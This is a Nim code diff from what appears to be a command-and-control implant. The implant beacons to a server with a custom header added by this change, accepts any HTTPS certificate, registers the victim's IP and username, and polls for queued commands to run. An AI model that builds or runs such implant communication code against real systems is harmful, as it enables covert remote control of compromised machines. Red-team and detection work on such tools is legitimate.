@@ -22,6 +22,7 @@ type
         taskPath* : string
         resultPath* : string
         userAgent* : string
+        customHeaderOne*: string
         cryptKey* : string
 
 # HTTP request function
@@ -43,11 +44,13 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
             if li.id != "":
                 headers = @[
                         Header(key: "X-Identifier", value: li.id),
-                        Header(key: "User-Agent", value: li.userAgent)
+                        Header(key: "User-Agent", value: li.userAgent),
+                        Header(key: "X-Header", value: li.customHeaderOne)
                     ]
             else:
                 headers = @[
-                        Header(key: "User-Agent", value: li.userAgent)
+                        Header(key: "User-Agent", value: li.userAgent),
+                        Header(key: "X-Header", value: li.customHeaderOne)
                     ]
 
             let req = Request(
@@ -67,6 +70,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 headers: @[
                     Header(key: "X-Identifier", value: li.id),
                     Header(key: "User-Agent", value: li.userAgent),
+                    Header(key: "X-Header", value: li.customHeaderOne),
                     Header(key: "Content-Type", value: "application/json")
                     ],
                 allowAnyHttpsCertificate: true,
@@ -120,7 +124,7 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
 
 # Watch for queued commands via GET request to the task path
 proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
-    var 
+    var
         res = doRequest(li, li.taskPath)
         cmdGuid : string
         cmd : string
@@ -144,7 +148,7 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
             var task = parsedResponseData["task"].getStr()
             cmdGuid = parsedResponseData["guid"].getStr()
 
-            try: 
+            try:
                 # Arguments are included with the task
                 cmd = task.split(' ', 1)[0].toLower()
                 args = parseCmdLine(task.split(' ', 1)[1])
